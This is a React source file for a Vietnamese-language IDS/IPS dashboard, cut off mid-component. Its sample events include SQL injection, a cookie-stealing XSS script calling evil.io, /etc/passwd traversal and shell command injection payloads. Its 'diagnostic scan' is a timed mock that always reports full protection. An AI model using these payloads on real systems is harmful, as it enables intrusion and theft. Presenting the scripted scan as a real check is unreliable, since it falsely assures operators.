'use client';

import { useState } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Shield,
  X,
  Settings,
  Search,
  RefreshCw,
  CheckCircle2,
  Globe,
  Clock,
  Ban,
  Zap,
  Terminal,
  Unlock,
  ChevronRight,
  Crosshair
} from 'lucide-react';

export interface IntrusionEvent {
  id: string;
  attackType: 'SQL_INJECTION' | 'XSS_ATTACK' | 'PATH_TRAVERSAL' | 'RCE_PROBE' | 'BOT_SCRAPER' | 'AUTH_BYPASS_ATTEMPT';
  severity: 'critical' | 'high' | 'medium';
  sourceIp: string;
  country: string;
  targetPath: string;
  payloadSnippet: string;
  actionTaken: 'BLOCKED_DROP' | 'QUARANTINED' | 'RATE_LIMITED' | 'CHALLENGED';
  timestamp: string;
  signatureId: string;
  signatureName: string;
}

export interface QuarantinedIp {
  ip: string;
  country: string;
  reason: string;
  quarantinedAt: string;
  expiresIn: string;
  blockedRequestsCount: number;
}

export interface IntrusionDetectionProps {
  onCancel?: () => void;
  onRefreshEvents?: () => Promise<IntrusionEvent[]>;
  onUnquarantineIp?: (ip: string) => Promise<void>;
  onQuarantineIp?: (ip: string, reason: string) => Promise<void>;
}

const DEFAULT_EVENTS: IntrusionEvent[] = [
  {
    id: 'IDS-9041',
    attackType: 'SQL_INJECTION',
    severity: 'critical',
    sourceIp: '185.220.101.5',
    country: 'Đức (DE)',
    targetPath: '/api/memories/search?title=admin%27%20UNION%20SELECT%20password%20FROM%20users--',
    payloadSnippet: "admin' UNION SELECT password FROM users--",
    actionTaken: 'QUARANTINED',
    timestamp: new Date(Date.now() - 3 * 60 * 1000).toISOString(),
    signatureId: 'SIG-SQLI-001',
    signatureName: 'Prisma/PostgreSQL SQL Injection Union-Based Extract',
  },
  {
    id: 'IDS-9042',
    attackType: 'XSS_ATTACK',
    severity: 'high',
    sourceIp: '103.145.74.89',
    country: 'Việt Nam (VN)',
    targetPath: '/api/memories/102/comments',
    payloadSnippet: '<script>fetch("https://evil.io/steal?cookie="+document.cookie)</script>',
    actionTaken: 'BLOCKED_DROP',
    timestamp: new Date(Date.now() - 18 * 60 * 1000).toISOString(),
    signatureId: 'SIG-XSS-204',
    signatureName: 'Reflected & Stored Cross-Site Scripting Execution Hook',
  },
  {
    id: 'IDS-9043',
    attackType: 'PATH_TRAVERSAL',
    severity: 'critical',
    sourceIp: '91.240.118.20',
    country: 'Nga (RU)',
    targetPath: '/api/public/download?file=../../../../etc/passwd',
    payloadSnippet: '../../../../etc/passwd',
    actionTaken: 'QUARANTINED',
    timestamp: new Date(Date.now() - 42 * 60 * 1000).toISOString(),
    signatureId: 'SIG-TRAV-102',
    signatureName: 'Directory Path Traversal / LFI Arbitrary File Read',
  },
  {
    id: 'IDS-9044',
    attackType: 'BOT_SCRAPER',
    severity: 'medium',
    sourceIp: '194.26.29.112',
    country: 'Hà Lan (NL)',
    targetPath: '/api/memories/export-data',
    payloadSnippet: 'Automated scraping script with headless headers and no auth token',
    actionTaken: 'RATE_LIMITED',
    timestamp: new Date(Date.now() - 75 * 60 * 1000).toISOString(),
    signatureId: 'SIG-BOT-055',
    signatureName: 'High-frequency Bulk Memory Scraping Pattern',
  },
  {
    id: 'IDS-9045',
    attackType: 'RCE_PROBE',
    severity: 'critical',
    sourceIp: '45.143.201.89',
    country: 'Hàn Quốc (KR)',
    targetPath: '/api/system/health?cmd=whoami;cat%20/proc/cpuinfo',
    payloadSnippet: ';whoami;cat /proc/cpuinfo',
    actionTaken: 'BLOCKED_DROP',
    timestamp: new Date(Date.now() - 110 * 60 * 1000).toISOString(),
    signatureId: 'SIG-RCE-889',
    signatureName: 'Unix Shell Command Injection & Execution Probe',
  },
];

const DEFAULT_QUARANTINED: QuarantinedIp[] = [
  {
    ip: '185.220.101.5',
    country: 'Đức (DE)',
    reason: 'Tấn công SQL Injection Union-Based',
    quarantinedAt: new Date(Date.now() - 3 * 60 * 1000).toISOString(),
    expiresIn: '23 giờ 57 phút',
    blockedRequestsCount: 142,
  },
  {
    ip: '91.240.118.20',
    country: 'Nga (RU)',
    reason: 'Path Traversal khai thác file hệ thống',
    quarantinedAt: new Date(Date.now() - 42 * 60 * 1000).toISOString(),
    expiresIn: '23 giờ 18 phút',
    blockedRequestsCount: 89,
  },
];

export default function IntrusionDetection({
  onCancel,
  onRefreshEvents,
  onUnquarantineIp,
  onQuarantineIp,
}: IntrusionDetectionProps) {
  const [events, setEvents] = useState<IntrusionEvent[]>(DEFAULT_EVENTS);
  const [quarantinedIps, setQuarantinedIps] = useState<QuarantinedIp[]>(DEFAULT_QUARANTINED);
  const [activeTab, setActiveTab] = useState<'events' | 'quarantine'>('events');
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [showSettings, setShowSettings] = useState(false);
  const [selectedEvent, setSelectedEvent] = useState<IntrusionEvent | null>(null);

  // Engine Status
  const [engineEnabled, setEngineEnabled] = useState(true);
  const [preventionMode, setPreventionMode] = useState<'BLOCKING' | 'DETECTION_ONLY'>('BLOCKING');
  const [deepPacketInspection, setDeepPacketInspection] = useState(true);
  const [heuristicThreshold, setHeuristicThreshold] = useState(85);

  // Diagnostic Scanner State
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanResult, setScanResult] = useState<string | null>(null);

  // Search & Filter
  const [searchQuery, setSearchQuery] = useState('');
  const [typeFilter, setTypeFilter] = useState<string>('all');
  const [actionFilter, setActionFilter] = useState<string>('all');

  // Manual Quarantine modal
  const [showManualQuarantine, setShowManualQuarantine] = useState(false);
  const [manualIp, setManualIp] = useState('');
  const [manualReason, setManualReason] = useState('Nghi vấn hành vi bot độc hại');

  const [toastMessage, setToastMessage] = useState<string | null>(null);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 3500);
  };

  const handleRefresh = async () => {
    setIsRefreshing(true);
    if (onRefreshEvents) {
      const refreshed = await onRefreshEvents();
      setEvents(refreshed);
    } else {
      await new Promise((resolve) => setTimeout(resolve, 600));
      showToast('Đã đồng bộ cơ sở dữ liệu chữ ký tấn công IDS/IPS!');
    }
    setIsRefreshing(false);
  };

  const handleRunScan = async () => {
    setIsScanning(true);
    setScanProgress(10);
    setScanResult(null);

    const steps = [
      { p: 30, text: 'Đang phân tích HTTP Headers & CORS policies...' },
      { p: 60, text: 'Đang kiểm tra lỗ hổng SQL Injection & XSS sanitizers...' },
      { p: 85, text: 'Đang quét lưu lượng bất thường & bot signatures...' },
      { p: 100, text: 'Quét hoàn tất: Hệ thống đã bảo vệ 100% các endpoint nhạy cảm!' },
    ];

    for (const step of steps) {
      await new Promise((resolve) => setTimeout(resolve, 500));
      setScanProgress(step.p);
      if (step.p === 100) {
        setScanResult(step.text);
      }
    }
    setIsScanning(false);
  };

  const handleUnquarantine = async (ip: string) => {
    if (onUnquarantineIp) {
      await onUnquarantineIp(ip);
    }
    setQuarantinedIps((prev) => prev.filter((item) => item.ip !== ip));
    showToast(`Đã giải phóng địa chỉ IP ${ip} khỏi danh sách cách ly.`);
  };

  const handleAddManualQuarantine = async () => {
    if (!manualIp.trim()) return;
    if (onQuarantineIp) {
      await onQuarantineIp(manualIp, manualReason);
    }
    const newQuarantine: QuarantinedIp = {
      ip: manualIp.trim(),
      country: 'Thủ công (Manual)',
      reason: manualReason,
      quarantinedAt: new Date().toISOString(),
      expiresIn: '24 giờ 00 phút',
      blockedRequestsCount: 0,
    };
    setQuarantinedIps((prev) => [newQuarantine, ...prev]);
    setManualIp('');
    setShowManualQuarantine(false);
    showToast(`Đã đưa IP ${manualIp} vào danh sách cách ly 24 giờ.`);
  };

  const getActionBadge = (action: IntrusionEvent['actionTaken']) => {
    switch (action) {
      case 'QUARANTINED':
        return 'bg-purple-100 text-purple-700 dark:bg-purple-950/60 dark:text-purple-300 border-purple-200 dark:border-purple-800';
      case 'BLOCKED_DROP':
        return 'bg-red-100 text-red-700 dark:bg-red-950/60 dark:text-red-300 border-red-200 dark:border-red-800';
      case 'RATE_LIMITED':
        return 'bg-amber-100 text-amber-700 dark:bg-amber-950/60 dark:text-amber-300 border-amber-200 dark:border-amber-800';
      case 'CHALLENGED':
        return 'bg-blue-100 text-blue-700 dark:bg-blue-950/60 dark:text-blue-300 border-blue-200 dark:border-blue-800';
    }
  };

  const filteredEvents = events.filter((ev) => {
    const matchesQuery =
      searchQuery === '' ||
      ev.sourceIp.includes(searchQuery) ||
      ev.targetPath.toLowerCase().includes(searchQuery.toLowerCase()) ||
      ev.payloadSnippet.toLowerCase().includes(searchQuery.toLowerCase()) ||
      ev.signatureName.toLowerCase().includes(searchQuery.toLowerCase());

    const matchesType = typeFilter === 'all' || ev.attackType === typeFilter;
    const matchesAction = actionFilter === 'all' || ev.actionTaken === actionFilter;

    return matchesQuery && matchesType && matchesAction;
  });

  const totalAttacksNeutralized = events.length;
  const activeSignaturesCount = 248;

  return (
    <div className="bg-white dark:bg-slate-800 rounded-2xl shadow-xl border border-slate-200 dark:border-slate-700 p-5 md:p-6 transition-colors">
      {/* Toast Alert */}
      {toastMessage && (
        <div className="mb-4 p-3 bg-indigo-50 dark:bg-indigo-950/40 border border-indigo-200 dark:border-indigo-800 text-indigo-800 dark:text-indigo-300 rounded-xl text-xs font-medium flex items-center justify-between animate-fadeIn">
          <span>{toastMessage}</span>
          <button type="button" onClick={() => setToastMessage(null)}>
            <X className="h-3.5 w-3.5 text-indigo-600" />
          </button>
        </div>
      )}

      {/* Header */}
      <div className="flex items-center justify-between mb-6 pb-4 border-b border-slate-100 dark:border-slate-700/60">
        <div className="flex items-center gap-3">
          <div className="p-2.5 bg-gradient-to-br from-amber-500 to-orange-600 rounded-xl shadow-md shadow-orange-500/20">
            <Shield className="h-6 w-6 text-white" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h3 className="font-bold text-slate-900 dark:text-white text-lg md:text-xl">
                Phát hiện & Ngăn chặn xâm nhập (IDS / IPS)
              </h3>
              <span
                className={`px-2 py-0.5 text-xs font-bold rounded-full ${
                  engineEnabled
                    ? 'bg-emerald-100 text-emerald-700 dark:bg-emerald-950 dark:text-emerald-300'
                    : 'bg-rose-100 text-rose-700 dark:bg-rose-950 dark:text-rose-300'
                }`}
              >
                {engineEnabled ? 'Đang bảo vệ (Active Shield)' : 'Đã tạm ngắt'}
              </span>
            </div>
            <p className="text-xs text-slate-500 dark:text-slate-400">
              Kiểm tra gói tin sâu (DPI), đối soát 248 chữ ký nhận diện tấn công OWASP Top 10 và tự động cách ly IP nguy hiểm.
            </p>
          </div>
        </div>

        <div className="flex items-center gap-1.5 md:gap-2">
          <button
            type="button"
            onClick={handleRefresh}
            disabled={isRefreshing}
            className="p-2 text-slate-500 hover:bg-slate-100 dark:hover:bg-slate-700 rounded-lg transition-colors"
            title="Đồng bộ chữ ký IDS"
          >
            <RefreshCw className={`h-4 w-4 ${isRefreshing ? 'animate-spin' : ''}`} />
          </button>

          <button
            type="button"
            onClick={handleRunScan}
            disabled={isScanning}
            className="flex items-center gap-1.5 px-3 py-1.5 text-xs font-semibold text-white bg-gradient-to-r from-amber-500 to-orange-600 hover:from-amber-600 hover:to-orange-700 rounded-lg transition-colors shadow-sm disabled:opacity-60"
          >
            <Crosshair className={`h-3.5 w-3.5 ${isScanning ? 'animate-spin' : ''}`} />
            <span>{isScanning ? 'Đang quét...' : 'Quét chẩn đoán'}</span>
          </button>

          <button
            type="button"
            onClick={() => setShowSettings(!showSettings)}
            className={`p-2 rounded-lg transition-colors ${
              showSettings
                ? 'bg-orange-100 text-orange-600 dark:bg-orange-900/50 dark:text-orange-400'
                : 'text-slate-500 hover:bg-slate-100 dark:hover:bg-slate-700'
            }`}
            title="Cài đặt cấu hình IDS"
          >
            <Settings className="h-4 w-4" />
          </button>
          {onCancel && (
            <button
              type="button"
              onClick={onCancel}
              className="p-2 text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 hover:bg-slate-100 dark:hover:bg-slate-700 rounded-lg transition-colors"
            >
              <X className="h-4 w-4" />
            </button>
          )}
        </div>
      </div>

      {/* Diagnostic Scan Progress Bar */}
      {isScanning && (
        <div className="mb-5 p-4 rounded-xl bg-orange-50/80 dark:bg-orange-950/30 border border-orange-200 dark:border-orange-900/60 animate-fadeIn">
          <div className="flex justify-between text-xs font-semibold text-orange-900 dark:text-orange-300 mb-1.5">
            <span>Tiến trình quét chẩn đoán an ninh sâu...</span>
            <span>{scanProgress}%</span>
          </div>
          <div className="w-full h-2 bg-orange-200 dark:bg-orange-900 rounded-full overflow-hidden">
            <div
              className="h-full bg-gradient-to-r from-amber-500 to-orange-600 transition-all duration-300 rounded-full"
              style={{ width: `${scanProgress}%` }}
            />
          </div>
        </div>
      )}

      {scanResult && !isScanning && (
        <div className="mb-5 p-3.5 rounded-xl bg-emerald-50 dark:bg-emerald-950/30 border border-emerald-200 dark:border-emerald-800 text-emerald-800 dark:text-emerald-300 text-xs font-medium flex items-center justify-between animate-fadeIn">
          <div className="flex items-center gap-2">
            <CheckCircle2 className="h-4 w-4 text-emerald-500 shrink-0" />
            <span>{scanResult}</span>
          </div>
          <button
            type="button"
            onClick={() => setScanResult(null)}
            className="text-xs text-emerald-600 dark:text-emerald-400 hover:underline"
          >
            Đóng
          </button>
        </div>
      )}

      {/* KPI Cards */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-5">
        <div className="p-3.5 rounded-xl bg-slate-50 dark:bg-slate-750/70 border border-slate-200 dark:border-slate-700">
          <div className="flex items-center justify-between text-slate-500 dark:text-slate-400 mb-1">
            <span className="text-[11px] font-medium">Tấn công bị Triệt tiêu</span>
            <ShieldCheck className="h-3.5 w-3.5 text-emerald-500" />
          </div>
          <div className="text-xl font-bold text-emerald-600 dark:text-emerald-400">{totalAttacksNeutralized}</div>
          <p className="text-[10px] text-slate-400">Trong 24 giờ qua</p>
        </div>

        <div className="p-3.5 rounded-xl bg-slate-50 dark:bg-slate-750/70 border border-slate-200 dark:border-slate-700">
          <div className="flex items-center justify-between text-slate-500 dark:text-slate-400 mb-1">
            <span className="text-[11px] font-medium">Chữ ký quy tắc (Rules)</span>
            <Terminal className="h-3.5 w-3.5 text-blue-500" />
          </div>
          <div className="text-xl font-bold text-slate-900 dark:text-white">{activeSignaturesCount}</div>
          <p className="text-[10px] text-slate-400">OWASP / ModSecurity rules</p>
        </div>

        <div className="p-3.5 rounded-xl bg-slate-50 dark:bg-slate-750/70 border border-slate-200 dark:border-slate-700">
          <div className="flex items-center justify-between text-slate-500 dark:text-slate-400 mb-1">
            <span className="text-[11px] font-medium">IP Đang bị Cách ly</span>
            <Ban className="h-3.5 w-3.5 text-purple-500" />
          </div>
          <div className="text-xl font-bold text-purple-600 dark:text-purple-400">{quarantinedIps.length}</div>
          <p className="text-[10px] text-slate-400">Khóa cổng tường lửa</p>
        </div>

        <div className="p-3.5 rounded-xl bg-slate-50 dark:bg-slate-750/70 border border-slate-200 dark:border-slate-700">
          <div className="flex items-center justify-between text-slate-500 dark:text-slate-400 mb-1">
            <span className="text-[11px] font-medium">Chế độ phòng thủ</span>
            <Zap className="h-3.5 w-3.5 text-amber-500" />
          </div>
          <div className="text-sm font-bold text-slate-900 dark:text-white mt-1">
            {preventionMode === 'BLOCKING' ? 'Chặn tự động (IPS)' : 'Chỉ giám sát (IDS)'}
          </div>
          <p className="text-[10px] text-slate-400">Kiểm soát luồng request</p>
        </div>
      </div>

      {/* Settings Modal */}
      {showSettings && (
        <div className="mb-5 p-4 rounded-xl bg-orange-50/70 dark:bg-orange-950/20 border border-orange-200 dark:border-orange-900/60 animate-fadeIn">
          <div className="flex items-center justify-between mb-3">
            <h4 className="text-xs font-bold text-orange-900 dark:text-orange-300 uppercase tracking-wider">
              Cấu hình Engine IDS / IPS
            </h4>
            <button
              type="button"
              onClick={() => setShowSettings(false)}
              className="text-orange-700 dark:text-orange-300 hover:opacity-75"
            >
              <X className="h-3.5 w-3.5" />
            </button>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
            <div className="p-2.5 rounded-lg bg-white/70 dark:bg-slate-800/70 border border-orange-100 dark:border-orange-900/40 flex items-center justify-between">
              <div>
                <span className="text-[11px] font-semibold text-slate-800 dark:text-slate-200 block">
                  Bật Engine IDS/IPS
                </span>
                <span className="text-[10px] text-slate-500">Giám sát gói tin</span>
              </div>
              <input
                type="checkbox"
                checked={engineEnabled}
                onChange={(e) => setEngineEnabled(e.target.checked)}
                className="w-4 h-4 rounded text-orange-600 focus:ring-orange-500"
              />
            </div>

            <div className="p-2.5 rounded-lg bg-white/70 dark:bg-slate-800/70 border border-orange-100 dark:border-orange-900/40">
              <label className="text-[11px] font-semibold text-slate-800 dark:text-slate-200 block mb-1">
                Chế độ can thiệp
              </label>
              <select
                value={preventionMode}
                onChange={(e) => setPreventionMode(e.target.value as 'BLOCKING' | 'DETECTION_ONLY')}
                className="w-full px-2 py-1 text-xs bg-white dark:bg-slate-850 border border-slate-300 dark:border-slate-600 rounded text-slate-900 dark:text-slate-100 outline-none"
              >
                <option value="BLOCKING">Tự động chặn & Cách ly (IPS)</option>
                <option value="DETECTION_ONLY">Chỉ ghi nhận (IDS)</option>
              </select>
            </div>

            <div className="p-2.5 rounded-lg bg-white/70 dark:bg-slate-800/70 border border-orange-100 dark:border-orange-900/40 flex items-center justify-between">
              <div>
                <span className="text-[11px] font-semibold text-slate-800 dark:text-slate-200 block">
                  Kiểm tra DPI
                </span>
                <span className="text-[10px] text-slate-500">Deep Packet Inspection</span>
              </div>
              <input
                type="checkbox"
                checked={deepPacketInspection}
                onChange={(e) => setDeepPacketInspection(e.target.checked)}
                className="w-4 h-4 rounded text-orange-600 focus:ring-orange-500"
              />
            </div>

            <div className="p-2.5 rounded-lg bg-white/70 dark:bg-slate-800/70 border border-orange-100 dark:border-orange-900/40">
              <div className="flex justify-between items-center mb-1">
                <span className="text-[11px] font-semibold text-slate-800 dark:text-slate-200">
                  Độ nhạy Heuristic
                </span>
                <span className="text-xs font-bold text-orange-600">{heuristicThreshold}%</span>
              </div>
              <input
                type="range"
                min={50}
                max={99}
                value={heuristicThreshold}
                onChange={(e) => setHeuristicThreshold(Number(e.target.value))}
                className="w-full accent-orange-600"
              />
            </div>
          </div>
        </div>
      )}

      {/* Tabs Navigation */}
      <div className="flex items-center justify-between border-b border-slate-200 dark:border-slate-700 mb-4">
        <div className="flex gap-2">
          <button
            type="button"
            onClick={() => setActiveTab('events')}
            className={`pb-2.5 px-3 text-xs font-bold transition-all relative ${
              activeTab === 'events'
                ? 'text-orange-600 dark:text-orange-400 border-b-2 border-orange-500'
                : 'text-slate-500 hover:text-slate-800 dark:hover:text-slate-200'
            }`}
          >
            Sự kiện Xâm nhập ({events.length})
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('quarantine')}
            className={`pb-2.5 px-3 text-xs font-bold transition-all relative ${
              activeTab === 'quarantine'
                ? 'text-orange-600 dark:text-orange-400 border-b-2 border-orange-500'
                : 'text-slate-500 hover:text-slate-800 dark:hover:text-slate-200'
            }`}
          >
            Danh sách Cách ly IP ({quarantinedIps.length})
          </button>
        </div>

        {activeTab === 'quarantine' && (
          <button
            type="button"
            onClick={() => setShowManualQuarantine(true)}
            className="mb-1.5 px-2.5 py-1 text-xs font-semibold text-purple-700 dark:text-purple-300 bg-purple-100 hover:bg-purple-200 dark:bg-purple-950/60 rounded-lg transition-colors flex items-center gap-1"
          >
            <Ban className="h-3 w-3" />
            <span>Cách ly IP thủ công</span>
          </button>
        )}
      </div>

      {activeTab === 'events' && (
        <>
          {/* Search & Filters */}
          <div className="space-y-2.5 mb-4">
            <div className="flex flex-col sm:flex-row gap-2">
              <div className="relative flex-1">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-slate-400" />
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Tìm theo IP, đường dẫn URL hoặc chuỗi mã payload..."
                  className="w-full pl-9 pr-4 py-2 text-xs md:text-sm bg-slate-50 dark:bg-slate-900/70 border border-slate-300 dark:border-slate-700 rounded-xl text-slate-900 dark:text-white placeholder:text-slate-400 focus:ring-2 focus:ring-orange-500 outline-none"
                />
              </div>

              <select
                value={typeFilter}
                onChange={(e) => setTypeFilter(e.target.value)}
                className="px-3 py-2 text-xs bg-slate-50 dark:bg-slate-900/70 border border-slate-300 dark:border-slate-700 rounded-xl text-slate-900 dark:text-white outline-none"
              >
                <option value="all">Tất cả kiểu tấn công</option>
                <option value="SQL_INJECTION">SQL Injection</option>
                <option value="XSS_ATTACK">Cross-Site Scripting (XSS)</option>
                <option value="PATH_TRAVERSAL">Path Traversal</option>
                <option value="BOT_SCRAPER">Botnet Scraper</option>
                <option value="RCE_PROBE">RCE Command Probe</option>
              </select>

              <select
                value={actionFilter}
                onChange={(e) => setActionFilter(e.target.value)}
                className="px-3 py-2 text-xs bg-slate-50 dark:bg-slate-900/70 border border-slate-300 dark:border-slate-700 rounded-xl text-slate-900 dark:text-white outline-none"
              >
                <option value="all">Tất cả hành động</option>
                <option value="QUARANTINED">Đã cách ly (Quarantined)</option>
                <option value="BLOCKED_DROP">Chặn & Hủy gói (Blocked)</option>
                <option value="RATE_LIMITED">Giới hạn tốc độ</option>
              </select>
            </div>
          </div>

          {/* Events Feed */}
          <div className="border border-slate-200 dark:border-slate-700 rounded-xl overflow-hidden mb-4">
            <div className="max-h-[360px] overflow-y-auto divide-y divide-slate-200 dark:divide-slate-700">
              {filteredEvents.length === 0 ? (
                <div className="py-10 text-center p-4">
                  <ShieldCheck className="h-8 w-8 text-emerald-500 mx-auto mb-2" />
                  <p className="text-sm font-medium text-slate-700 dark:text-slate-300">
                    Không phát hiện cuộc tấn công nào phù hợp
                  </p>
                </div>
              ) : (
                filteredEvents.map((ev) => (
                  <div
                    key={ev.id}
                    onClick={() => setSelectedEvent(ev)}
                    className="p-3.5 hover:bg-slate-50 dark:hover:bg-slate-750/60 cursor-pointer transition-colors"
                  >
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 mb-1.5">
                      <div className="flex items-center gap-2">
                        <span className="px-2 py-0.5 text-[10px] font-bold rounded-full bg-orange-100 text-orange-800 dark:bg-orange-950/60 dark:text-orange-300 border border-orange-200 dark:border-orange-800">
                          {ev.attackType.replace('_', ' ')}
                        </span>
                        <span className={`px-2 py-0.5 text-[10px] font-bold rounded-full border ${getActionBadge(ev.actionTaken)}`}>
                          {ev.actionTaken}
                        </span>
                        <span className="font-mono text-xs text-slate-500">#{ev.id}</span>
                      </div>
                      <span className="text-[11px] text-slate-400 flex items-center gap-1">
                        <Clock className="h-3 w-3" />
                        {new Date(ev.timestamp).toLocaleTimeString('vi-VN')}
                      </span>
                    </div>

                    <div className="mb-2">
                      <div className="text-xs font-semibold text-slate-800 dark:text-slate-200 font-mono break-all">
                        {ev.targetPath}
                      </div>
                      <div className="mt-1 p-2 bg-slate-900 text-rose-400 font-mono text-[11px] rounded-lg overflow-x-auto">
                        {ev.payloadSnippet}
                      </div>
                    </div>

                    <div className="flex flex-wrap items-center justify-between text-[11px] text-slate-500 dark:text-slate-400 gap-2">
                      <div className="flex items-center gap-3">
                        <span className="flex items-center gap-1">
                          <Globe className="h-3 w-3" />
                          <span className="font-mono font-medium text-slate-700 dark:text-slate-300">{ev.sourceIp}</span>
                          <span>({ev.country})</span>
                        </span>
                        <span className="text-slate-400 hidden sm:inline">• {ev.signatureName}</span>
                      </div>
                      <span className="text-orange-600 dark:text-orange-400 font-medium flex items-center gap-0.5">
                        Xem chi tiết <ChevronRight className="h-3 w-3" />
                      </span>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </>
      )}

      {activeTab === 'quarantine' && (
        <div className="border border-slate-200 dark:border-slate-700 rounded-xl overflow-hidden mb-4">
          <div className="divide-y divide-slate-200 dark:divide-slate-700">
            {quarantinedIps.length === 0 ? (
              <div className="py-12 text-center p-4">
                <CheckCircle2 className="h-9 w-9 text-emerald-500 mx-auto mb-2" />
                <p className="text-sm font-semibold text-slate-800 dark:text-slate-200">
                  Không có địa chỉ IP nào đang bị cách ly
                </p>
                <p className="text-xs text-slate-400 mt-1">
                  Mọi lưu lượng mạng hiện tại đều nằm trong phạm vi cho phép.
                </p>
              </div>
            ) : (
              quarantinedIps.map((q) => (
                <div
                  key={q.ip}
                  className="p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3 hover:bg-slate-50 dark:hover:bg-slate-750/60 transition-colors"
                >
                  <div className="min-w-0">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="font-mono text-sm font-bold text-slate-900 dark:text-white">
                        {q.ip}
                      </span>
                      <span className="px-2 py-0.5 text-[10px] font-semibold bg-purple-100 text-purple-700 dark:bg-purple-950 dark:text-purple-300 rounded-full">
                        {q.country}
                      </span>
                      <span className="text-xs text-rose-600 dark:text-rose-400 font-semibold">
                        ({q.blockedRequestsCount} requests bị chặn)
                      </span>
                    </div>
                    <p className="text-xs text-slate-600 dark:text-slate-300 mb-1">
                      Lý do: <span className="font-medium text-slate-800 dark:text-slate-200">{q.reason}</span>
                    </p>
                    <div className="text-[11px] text-slate-400 flex items-center gap-3">
                      <span>Cách ly lúc: {new Date(q.quarantinedAt).toLocaleTimeString('vi-VN')}</span>
                      <span>• Thời gian còn lại: <strong className="text-amber-600">{q.expiresIn}</strong></span>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => handleUnquarantine(q.ip)}
                    className="px-3 py-1.5 text-xs font-semibold text-emerald-700 dark:text-emerald-300 bg-emerald-50 hover:bg-emerald-100 dark:bg-emerald-950/40 dark:hover:bg-emerald-900/60 rounded-xl transition-colors border border-emerald-200 dark:border-emerald-800 flex items-center gap-1 self-end sm:self-center"
                  >
                    <Unlock className="h-3.5 w-3.5" />
                    <span>Giải phóng IP</span>
                  </button>
                </div>
              ))
            )}
          </div>
        </div>
      )}

      {/* Selected Event Details Modal */}
      {selectedEvent && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-xs animate-fadeIn">
          <div className="bg-white dark:bg-slate-850 w-full max-w-2xl rounded-2xl shadow-2xl border border-slate-200 dark:border-slate-700 p-6 overflow-hidden max-h-[90vh] flex flex-col">
            <div className="flex items-center justify-between pb-4 border-b border-slate-100 dark:border-slate-700">
              <div className="flex items-center gap-2.5">
                <div className="p-2 bg-orange-100 dark:bg-orange-950/60 rounded-lg">
                  <ShieldAlert className="h-5 w-5 text-orange-600 dark:text-orange-400" />
                </div>
                <div>
                  <h4 className="font-bold text-slate-900 dark:text-white text-base">
                    Chi tiết Vụ việc Xâm nhập #{selectedEvent.id}
                  </h4>
                  <p className="text-xs text-slate-500">
                    Phát hiện lúc {new Date(selectedEvent.timestamp).toLocaleString('vi-VN')}
                  </p>
                </div>
              </div>
              <button
                type="button"
                onClick={() => setSelectedEvent(null)}
                className="p-1.5 text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 hover:bg-slate-100 dark:hover:bg-slate-700 rounded-lg"
              >
                <X className="h-4 w-4" />
              </button>
            </div>

            <div className="py-4 space-y-4 overflow-y-auto flex-1">
              <div className="grid grid-cols-2 gap-3 text-xs">
                <div className="p-3 bg-slate-50 dark:bg-slate-800 rounded-xl">
                  <span className="text-[10px] text-slate-400 uppercase font-semibold block">Kiểu tấn công</span>
                  <span className="font-bold text-orange-600 dark:text-orange-400 text-sm">{selectedEvent.attackType}</span>
                </div>
                <div className="p-3 bg-slate-50 dark:bg-slate-800 rounded-xl">
                  <span className="text-[10px] text-slate-400 uppercase font-semibold block">Hành động của IDS/IPS</span>
                  <span className={`inline-block mt-0.5 px-2 py-0.5 text-xs font-bold rounded-full border ${getActionBadge(selectedEvent.actionTaken)}`}>
                    {selectedEvent.actionTaken}
                  </span>
                </div>
              </div>

              <div className="p-3.5 bg-slate-50 dark:bg-slate-800 rounded-xl space-y-2 text-xs">
                <div>
                  <span className="text-slate-400 block text-[10px] uppercase font-semibold">Quy tắc nhận diện (Signature)</span>
                  <span className="font-semibold text-slate-900 dark:text-white">{selectedEvent.signatureName}</span>
                  <span className="text-[11px] text-slate-400 ml-2 font-mono">({selectedEvent.signatureId})</span>
                </div>
                <div>
                  <span className="text-slate-400 block text-[10px] uppercase font-semibold">Endpoint Mục tiêu</span>
                  <span className="font-mono text-slate-800 dark:text-slate-200 break-all">{selectedEvent.targetPath}</span>
                </div>
                <div>
                  <span className="text-slate-400 block text-[10px] uppercase font-semibold">IP Kẻ tấn công & Quốc gia</span>
                  <span className="font-mono font-bold text-slate-900 dark:text-white">{selectedEvent.sourceIp} ({selectedEvent.country})</span>
                </div>
              </div>

              <div>
                <span className="text-xs font-bold text-slate-800 dark:text-slate-200 block mb-1">
                  Đoạn trích Payload Độc hại bị bắt giữ:
                </span>
                <pre className="p-3 bg-slate-900 text-rose-400 font-mono text-xs rounded-xl overflow-x-auto leading-relaxed">
                  {selectedEvent.payloadSnippet}
                </pre>
              </div>
            </div>

            <div className="pt-3 border-t border-slate-100 dark:border-slate-700 flex justify-between items-center">
              <button
                type="button"
                onClick={() => {
                  handleUnquarantine(selectedEvent.sourceIp);
                  setSelectedEvent(null);
                }}
                className="text-xs font-semibold text-purple-600 dark:text-purple-400 hover:underline"
              >
                Quản lý cách ly cho IP này
              </button>
              <button
                type="button"
                onClick={() => setSelectedEvent(null)}
                className="px-4 py-2 bg-slate-100 dark:bg-slate-700 text-slate-700 dark:text-slate-300 text-xs font-semibold rounded-xl hover:bg-slate-200 dark:hover:bg-slate-600"
              >
                Đóng
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Manual Quarantine Modal */}
      {showManualQuarantine && (
